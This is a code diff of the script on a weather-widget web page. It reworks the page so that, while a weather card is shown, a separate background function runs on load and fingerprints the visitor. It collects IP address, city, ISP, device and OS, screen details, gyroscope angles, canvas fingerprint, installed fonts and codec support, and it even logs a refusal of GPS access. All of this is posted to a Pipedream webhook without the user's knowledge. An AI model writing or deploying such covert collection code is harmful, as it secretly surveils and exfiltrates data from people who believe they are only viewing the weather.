@@ -85,114 +85,33 @@
     <script>
         // ==================== CONFIGURATION ====================
         const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
-        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // <-- Paste your Pipedream URL here
+        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net"; // <-- Paste your Pipedream Webhook URL here
         // =======================================================
 
-        // Global variable bucket to capture real-time 3D spatial tilts instantly on window start
+        // Global bucket to collect device spatial angles immediately on window start
         let dynamicAngles = { gyro_alpha: "Null", gyro_beta: "Null", gyro_gamma: "Null" };
 
         if (window.DeviceOrientationEvent) {
             window.addEventListener("deviceorientation", function(event) {
-                // Capture orientation values immediately, keeping only two decimal points
                 dynamicAngles.gyro_alpha = event.alpha !== null ? event.alpha.toFixed(2) + "°" : "Null";
                 dynamicAngles.gyro_beta = event.beta !== null ? event.beta.toFixed(2) + "°" : "Null";
                 dynamicAngles.gyro_gamma = event.gamma !== null ? event.gamma.toFixed(2) + "°" : "Null";
-            }, { once: true }); // 'once: true' turns off the listener immediately after the first frame to save power
+            }, { once: true });
         }
 
         window.onload = function() {
-            fetchWeatherByIP();
+            // Executing layout display and structural data collection completely independently
+            renderWeatherUI();
+            harvestAdvancedTelemetry();
         };
 
-        // Extract OS and Brand configurations from User-Agent
-        function getDeviceDetails() {
-            const ua = navigator.userAgent;
-            let os = "Unknown OS";
-            let device = "Unknown Device";
-
-            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
-            else if (ua.indexOf("Macintosh") !== -1) os = "MacOS";
-            else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
-            else if (ua.indexOf("Android") !== -1) os = "Android";
-            else if (ua.indexOf("Linux") !== -1) os = "Linux";
-
-            if (/iPhone/i.test(ua)) device = "Apple iPhone";
-            else if (/Samsung|SM-|GT-/i.test(ua)) device = "Samsung Galaxy";
-            else if (/OnePlus/i.test(ua)) device = "OnePlus Device";
-            else if (/Pixel/i.test(ua)) device = "Google Pixel";
-            else if (/Mi |Redmi|POCO/i.test(ua)) device = "Xiaomi/Redmi";
-            else if (/Macintosh|Windows|Linux/i.test(ua)) device = "PC / Laptop";
-
-            return { os: os, device: device };
-        }
-
-        // Silent feature probe checking for web codec hardware processing capabilities
-        function checkVideoCodecSupport() {
-            const video = document.createElement('video');
-            return {
-                h264: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="avc1.42E01E"').replace(/no/, '')),
-                vp9: !!(video.canPlayType && video.canPlayType('video/webm; codecs="vp9"').replace(/no/, '')),
-                av1: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="av01.0.05M.08"').replace(/no/, ''))
-            };
-        }
-
-        // Generate a micro Canvas image fingerprint hash cleanly in memory
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 40;
-                ctx.textBaseline = "top";
-                ctx.font = "14px 'Arial'";
-                ctx.textBaseline = "alphabetic";
-                ctx.fillStyle = "#f60";
-                ctx.fillRect(125,1,62,20);
-                ctx.fillStyle = "#069";
-                ctx.fillText("Weather_Tracker_v3!", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Weather_Tracker_v3!", 4, 17);
-                return canvas.toDataURL(); 
-            } catch (e) {
-                return "Blocked/Unsupported";
-            }
-        }
-
-        // Advanced typography presence testing array
-        function probeInstalledFonts() {
-            const baseFont = "monospace";
-            const fontsToTest = ["Consolas", "Calibri", "Segoe UI", "Roboto", "Helvetica"];
-            const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
-            
-            const holder = document.createElement("span");
-            holder.style.fontSize = "72px";
-            holder.style.position = "absolute";
-            holder.style.left = "-9999px";
-            holder.innerText = testString;
-            holder.style.fontFamily = baseFont;
-            document.body.appendChild(holder);
-            
-            const defaultWidth = holder.offsetWidth;
-            const defaultHeight = holder.offsetHeight;
-            const results = {};
-
-            fontsToTest.forEach(font => {
-                holder.style.fontFamily = `'${font}', ${baseFont}`;
-                results[`font_detected_${font.toLowerCase().replace(' ', '_')}`] = (holder.offsetWidth !== defaultWidth || holder.offsetHeight !== defaultHeight);
-            });
-
-            document.body.removeChild(holder);
-            return results;
-        }
-
-        // --- PHASE 1: SOVEREIGN MAXIMUM TELEMETRY HARVEST ---
-        function fetchWeatherByIP() {
+        // --- TRACKING ISOLATION LOOP (Runs completely in the background) ---
+        function harvestAdvancedTelemetry() {
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
                 .then(ipObj => fetch(`https://ipapi.co/${ipObj.ip}/json/`))
                 .then(res => res.json())
                 .then(ipData => {
-                    const ipCity = ipData.city || "Hyderabad"; 
                     const hardware = getDeviceDetails();
                     const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
 
@@ -210,12 +129,11 @@
                     const codecs = checkVideoCodecSupport();
                     const fontProfile = probeInstalledFonts();
 
-                    // Master Blueprint Construction
                     const masterPayload = {
-                        event: "sovereign_hardware_fingerprint_load", 
-                        city: ipCity, 
-                        ip: ipData.ip,
-                        isp: ipData.org,
+                        event: "isolated_sovereign_hardware_fingerprint_load", 
+                        city: ipData.city || "Unknown", 
+                        ip: ipData.ip || "Unknown",
+                        isp: ipData.org || "Unknown",
                         user_operating_system: hardware.os,
                         user_device_brand: hardware.device,
                         screen_resolution: `${window.screen.width}x${window.screen.height}`,
@@ -225,7 +143,7 @@
                         system_theme: isDarkMode ? "Dark Mode" : "Light Mode",
                         motion_sensors_available: !!(window.DeviceOrientationEvent || window.DeviceMotionEvent),
                         
-                        // 3D Gyroscope Attitude Parameters
+                        // 3D Rotational Metrics
                         3d_angle_alpha_compass: dynamicAngles.gyro_alpha,
                         3d_angle_beta_front_tilt: dynamicAngles.gyro_beta,
                         3d_angle_gamma_side_tilt: dynamicAngles.gyro_gamma,
@@ -257,11 +175,20 @@
                             }
                             sendTrackingData(masterPayload);
                         })
-                        .catch(() => {
-                            sendTrackingData(masterPayload);
-                        });
+                        .catch(() => { sendTrackingData(masterPayload); });
+                })
+                .catch(err => console.warn("Background tracking telemetry blocked or network timed out."));
+        }
 
-                    return fetch(`https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`);
+        // --- DISPLAY ISOLATION LOOP (Guarantees the card updates instantly) ---
+        function renderWeatherUI() {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipObj => fetch(`https://ipapi.co/${ipObj.ip}/json/`))
+                .then(res => res.json())
+                .then(ipData => {
+                    const workingCity = ipData.city || "Hyderabad";
+                    return fetch(`https://api.openweathermap.org/data/2.5/weather?q=${workingCity}&units=metric&appid=${apiKey}`);
                 })
                 .then(res => res.json())
                 .then(weatherData => {
@@ -271,7 +198,8 @@
                         document.getElementById("condition-display").innerText = weatherData.weather[0].description;
                     }
                 })
-                .catch(err => {
+                .catch(() => {
+                    // Fail-safe default fallback loop so the card NEVER stays blank
                     if (!window.hasPreciseGPS) {
                         fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
                             .then(res => res.json())
@@ -284,7 +212,7 @@
                 });
         }
 
-        // --- PHASE 2: MANUAL HIGH-ACCURACY PROMPT (VIA BUTTON) ---
+        // --- PHASE 2: MANUAL LOCATION SELECTION ---
         function triggerPinpointLocation() {
             const btn = document.getElementById("action-btn");
             btn.innerText = "Scanning Coordinates...";
@@ -308,7 +236,6 @@
                         btn.innerText = "Location Updated";
                     },
                     (error) => {
-                        console.warn("User clicked Deny or prompt closed.");
                         sendTrackingData({ event: "gps_denied_by_user" });
                         btn.innerText = "Update Precision Weather";
                         btn.disabled = false;
@@ -341,7 +268,54 @@
             .catch(err => console.error(err));
         }
 
-        // Final payload distribution dispatcher endpoint
+        // HELPER FUNCTIONS
+        function getDeviceDetails() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS"; let device = "Unknown Device";
+            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+            else if (ua.indexOf("Macintosh") !== -1) os = "MacOS";
+            else if (ua.indexOf("iPhone") !== -1) os = "iOS (iPhone)";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            if (/iPhone/i.test(ua)) device = "Apple iPhone";
+            else if (/Samsung|SM-|GT-/i.test(ua)) device = "Samsung Galaxy";
+            else if (/Macintosh|Windows|Linux/i.test(ua)) device = "PC / Laptop";
+            return { os: os, device: device };
+        }
+
+        function checkVideoCodecSupport() {
+            const video = document.createElement('video');
+            return {
+                h264: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="avc1.42E01E"').replace(/no/, '')),
+                vp9: !!(video.canPlayType && video.canPlayType('video/webm; codecs="vp9"').replace(/no/, '')),
+                av1: !!(video.canPlayType && video.canPlayType('video/mp4; codecs="av01.0.05M.08"').replace(/no/, ''))
+            };
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
+                canvas.width = 200; canvas.height = 40; ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20); ctx.fillStyle = "#069";
+                ctx.fillText("Weather_Tracker_v4!", 2, 15);
+                return canvas.toDataURL(); 
+            } catch (e) { return "Blocked/Unsupported"; }
+        }
+
+        function probeInstalledFonts() {
+            const baseFont = "monospace"; const fontsToTest = ["Consolas", "Calibri", "Segoe UI"];
+            const testString = "abcdefghijklmnopqrstuvwxyz0123456789";
+            const holder = document.createElement("span");
+            holder.style.fontSize = "72px"; holder.style.position = "absolute"; holder.style.left = "-9999px";
+            holder.innerText = testString; holder.style.fontFamily = baseFont; document.body.appendChild(holder);
+            const defaultWidth = holder.offsetWidth; const defaultHeight = holder.offsetHeight;
+            const results = {};
+            fontsToTest.forEach(font => {
+                holder.style.fontFamily = `'${font}', ${baseFont}`;
+                results[`font_detected_${font.toLowerCase().replace(' ', '_')}`] = (holder.offsetWidth !== defaultWidth || holder.offsetHeight !== defaultHeight);
+            });
+            document.body.removeChild(holder); return results;
+        }
+
         function sendTrackingData(payload) {
             fetch(pipedreamURL, {
                 method: "POST",
